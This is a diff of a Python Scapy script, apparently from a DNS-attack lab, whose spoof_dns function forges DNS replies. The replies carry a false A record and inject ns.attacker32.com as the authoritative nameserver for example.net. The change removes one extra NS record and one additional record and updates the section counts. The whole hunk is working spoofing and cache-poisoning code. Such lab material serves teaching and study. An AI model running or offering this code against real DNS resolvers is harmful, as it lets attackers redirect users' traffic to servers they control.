@@ -11,13 +11,13 @@ def spoof_dns(pkt):
 		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.10.30.6')
 		# The Authority Section
 		NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns.attacker32.com')
-		NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns.example.net')
+		#NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns.example.net')
 		# The Additional Section
 		Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
 		Addsec2 = DNSRR(rrname='ns.example.net', type='A', ttl=259200, rdata='5.6.7.8')
-		Addsec3 = DNSRR(rrname='ns.facebook.com', type='A', ttl=259200, rdata='3.4.5.6')
+		#Addsec3 = DNSRR(rrname='ns.facebook.com', type='A', ttl=259200, rdata='3.4.5.6')
 		# Construct the DNS packet
-		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=3, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3)
+		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=2, an=Anssec, ns=NSsec1, ar=Addsec1/Addsec2)
 		# Construct the entire IP packet and send it out
 		spoofpkt = IPpkt/UDPpkt/DNSpkt
 		send(spoofpkt)
